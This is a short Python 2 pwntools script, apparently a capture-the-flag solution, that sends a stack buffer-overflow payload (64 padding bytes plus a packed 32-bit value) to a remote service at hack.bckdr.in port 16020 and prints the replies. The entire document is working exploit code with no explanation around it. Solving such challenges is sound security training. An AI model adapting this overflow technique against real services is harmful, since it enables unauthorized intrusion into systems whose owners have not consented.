from pwn import *

payload = 'A'*64+p32(0x65643063)
p = remote('hack.bckdr.in', 16020)
print p.recv()
p.sendline(payload)
print p.recv()
